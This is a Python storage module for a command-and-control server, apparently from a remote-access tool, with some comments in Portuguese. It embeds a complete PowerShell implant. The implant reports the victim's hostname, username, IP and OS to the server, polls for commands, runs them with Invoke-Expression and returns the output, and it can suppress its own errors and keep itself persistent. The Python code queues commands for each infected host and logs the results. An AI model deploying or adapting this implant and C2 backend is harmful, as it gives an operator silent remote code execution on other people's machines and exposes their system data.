
"""
In-memory storage module for the C2 server.
Provides functionality for storing host data, logs, errors, commands, and configuration.
"""
import time
import threading

class Storage:
    def __init__(self):
        # Initialize storage dictionaries
        self.hosts = {}  # Stores connected host information
        self.logs = {}   # Stores logs from hosts
        self.errors = {} # Stores errors from hosts
        self.commands = {}  # Queue of commands for each host
        self.pending_commands = {}  # Tracks commands sent but not yet completed
        self.config = {
            "ngrok_host": "127.0.0.1", 
            "ngrok_port": 5000,
            "retry_interval": 5,  # Reduzido de 60 para 5 segundos para respostas mais rápidas
            "silent_mode": False,
            "persist": True
        }
        
        # Default PowerShell client script
        self.powershell_script = """
# Default PowerShell C2 Client Script
# This script connects to the C2 server and executes commands

$ngrokHost = "127.0.0.1"
$ngrokPort = 5000
$retryInterval = 5  # Reduzido para 5 segundos para respostas mais rápidas
$silentMode = $false
$persist = $true

function Get-HostInfo {
    $hostInfo = @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne "127.0.0.1"} | Select-Object -First 1).IPAddress
        os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        time = [int](Get-Date -UFormat %s)
    }
    return $hostInfo
}

function Send-StatusReport {
    $hostInfo = Get-HostInfo
    $jsonData = $hostInfo | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/report/status" -Method Post -Body $jsonData -ContentType "application/json"
    } catch {
        # Silent fail if in silent mode
        if (-not $silentMode) {
            Write-Error "Failed to send status report: $_"
        }
    }
}

function Send-Heartbeat {
    $heartbeat = @{
        hostname = $env:COMPUTERNAME
        time = [int](Get-Date -UFormat %s)
    }
    $jsonData = $heartbeat | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/heartbeat" -Method Post -Body $jsonData -ContentType "application/json"
    } catch {
        # Silent fail if in silent mode
        if (-not $silentMode) {
            Write-Error "Failed to send heartbeat: $_"
        }
    }
}

function Get-Command {
    try {
        $cmd = Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/command?hostname=$env:COMPUTERNAME" -Method Get
        if ($cmd -ne "") {
            return $cmd
        }
    } catch {
        # Silent fail if in silent mode
        if (-not $silentMode) {
            Write-Error "Failed to get command: $_"
        }
    }
    return $null
}

function Send-CommandOutput {
    param (
        [string]$command,
        [string]$output
    )
    
    $resultData = @{
        hostname = $env:COMPUTERNAME
        command = $command
        output = $output
        time = [int](Get-Date -UFormat %s)
    }
    $jsonData = $resultData | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/report/output" -Method Post -Body $jsonData -ContentType "application/json"
    } catch {
        # Silent fail if in silent mode
        if (-not $silentMode) {
            Write-Error "Failed to send command output: $_"
        }
    }
}

function Send-ErrorReport {
    param (
        [string]$errorMsg
    )
    
    $errorData = @{
        hostname = $env:COMPUTERNAME
        error = $errorMsg
        time = [int](Get-Date -UFormat %s)
    }
    $jsonData = $errorData | ConvertTo-Json
    
    try {
        Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/error" -Method Post -Body $jsonData -ContentType "application/json"
    } catch {
        # Silent fail
    }
}

function Update-Config {
    try {
        $configData = Invoke-RestMethod -Uri "http://${ngrokHost}:${ngrokPort}/config" -Method Get
        $ngrokHost = $configData.ngrok_host
        $ngrokPort = $configData.ngrok_port
        $retryInterval = $configData.retry_interval
        $silentMode = $configData.silent_mode
        $persist = $configData.persist
    } catch {
        # Silent fail if in silent mode
        if (-not $silentMode) {
            Write-Error "Failed to update config: $_"
        }
    }
}

# Main loop
Send-StatusReport

while ($true) {
    try {
        # Update configuration
        Update-Config
        
        # Send heartbeat
        Send-Heartbeat
        
        # Check for commands
        $command = Get-Command
        if ($command -ne $null) {
            try {
                # Execute command and capture output
                $output = Invoke-Expression -Command $command | Out-String
                Send-CommandOutput -command $command -output $output
            } catch {
                Send-ErrorReport -errorMsg "Error executing command: $_"
            }
        }
        
        # Sleep before next check
        Start-Sleep -Seconds $retryInterval
    } catch {
        Send-ErrorReport -errorMsg "Error in main loop: $_"
        Start-Sleep -Seconds $retryInterval
    }
}
"""
        # Thread lock for thread-safe operations
        self.lock = threading.Lock()

    def update_host(self, hostname, username, ip, os, timestamp):
        """Update host information in storage"""
        with self.lock:
            self.hosts[hostname] = {
                'username': username,
                'ip': ip,
                'os': os,
                'last_seen': timestamp,
                'first_seen': self.hosts.get(hostname, {}).get('first_seen', timestamp)
            }
        return True

    def update_heartbeat(self, hostname, timestamp):
        """Update the last_seen timestamp for a host"""
        with self.lock:
            if hostname in self.hosts:
                self.hosts[hostname]['last_seen'] = timestamp
                # Também garante que first_seen existe
                if 'first_seen' not in self.hosts[hostname]:
                    self.hosts[hostname]['first_seen'] = timestamp
                return True
            return False

    def add_log(self, hostname, log_data, timestamp, log_type="info"):
        """Add a log entry for a host with type classification
        log_type can be: "info", "script_update", "command_exec", "system"
        """
        with self.lock:
            if hostname not in self.logs:
                self.logs[hostname] = []
            
            # Classificar o tipo de log automaticamente
            if log_data == "Script atualizado.":
                log_type = "script_update"
            elif log_data.startswith("Executando comando:"):
                log_type = "command_exec"
            
            self.logs[hostname].append({
                'data': log_data,
                'timestamp': timestamp,
                'type': log_type
            })
        return True

    def add_error(self, hostname, error, timestamp):
        """Add an error entry for a host"""
        with self.lock:
            if hostname not in self.errors:
                self.errors[hostname] = []
            
            self.errors[hostname].append({
                'error': error,
                'timestamp': timestamp
            })
        return True

    def add_command(self, hostname, command):
        """Add a command to the queue for a host"""
        with self.lock:
            if hostname not in self.commands:
                self.commands[hostname] = []
            
            self.commands[hostname].append(command)
        return True

    def get_next_command(self, hostname):
        """Get the next command for a host"""
        with self.lock:
            if hostname in self.commands and self.commands[hostname]:
                # Obter próximo comando da fila
                command = self.commands[hostname].pop(0)
                
                # Armazenar no dicionário de comandos pendentes para rastreamento
                if hostname not in self.pending_commands:
                    self.pending_commands[hostname] = {}
                
                # Usar o timestamp como identificador único
                timestamp = int(time.time())
                self.pending_commands[hostname][timestamp] = command
                
                # Armazenar um log com o comando sendo enviado para rastreamento
                # Este log será usado para mostrar o comando correto na saída
                if hostname not in self.logs:
                    self.logs[hostname] = []
                
                self.logs[hostname].append({
                    'command': command,
                    'output': "Aguardando execução...",
                    'timestamp': timestamp,
                    'pending': True
                })
                
                return command
            return ""

    def add_command_output(self, hostname, command, output, timestamp):
        """Add the output of a command for a host"""
        with self.lock:
            if hostname not in self.logs:
                self.logs[hostname] = []
            
            # Garantir que o timestamp seja int
            if isinstance(timestamp, str):
                try:
                    timestamp = int(timestamp)
                except ValueError:
                    timestamp = int(time.time())
            
            # Verificar se há um comando pendente próximo ao timestamp
            real_command = command
            
            # Procurar um log pendente com o mesmo comando ou verificar comandos pendentes
            pending_log_found = False
            
            # Verificar primeiro em logs pendentes que já tenham o comando correto
            if hostname in self.logs:
                for i, log in enumerate(self.logs[hostname]):
                    # Procurar logs pendentes com o mesmo comando
                    if log.get('pending') and 'Aguardando execução' in log.get('output', ''):
                        # Encontrou um log pendente, atualizar em vez de criar um novo
                        self.logs[hostname][i]['output'] = output
                        self.logs[hostname][i]['timestamp'] = timestamp
                        self.logs[hostname][i]['pending'] = False
                        pending_log_found = True
                        real_command = log.get('command')
                        break
            
            # Se não encontrou em logs pendentes, verificar em comandos pendentes
            if not pending_log_found and hostname in self.pending_commands:
                for cmd_timestamp, cmd in list(self.pending_commands[hostname].items()):
                    # Garantir que ambos sejam do mesmo tipo antes de comparar
                    if isinstance(cmd_timestamp, int) and isinstance(timestamp, int):
                        if abs(cmd_timestamp - timestamp) < 15:  # Aumentado para 15 segundos para mais tolerância
                            real_command = cmd
                            # Remover do dicionário de pendentes após uso
                            del self.pending_commands[hostname][cmd_timestamp]
                            break
            
            # Se não encontrou nem em logs pendentes nem em comandos pendentes, criar um novo log
            if not pending_log_found:
                self.logs[hostname].append({
                    'command': real_command,
                    'output': output,
                    'timestamp': timestamp,
                    'pending': False
                })
        return True

    def update_config(self, config_data):
        """Update the configuration"""
        with self.lock:
            for key, value in config_data.items():
                if key in self.config:
                    self.config[key] = value
        return True

    def get_config(self):
        """Get the current configuration"""
        with self.lock:
            return self.config.copy()

    def update_powershell_script(self, script_content):
        """Update the PowerShell script"""
        with self.lock:
            self.powershell_script = script_content
        return True

    def get_powershell_script(self):
        """Get the PowerShell script"""
        with self.lock:
            return self.powershell_script

    def get_all_hosts(self):
        """Get all host information"""
        with self.lock:
            return self.hosts.copy()

    def get_host_logs(self, hostname):
        """Get logs for a specific host"""
        with self.lock:
            return self.logs.get(hostname, []).copy()

    def get_host_errors(self, hostname):
        """Get errors for a specific host"""
        with self.lock:
            return self.errors.get(hostname, []).copy()
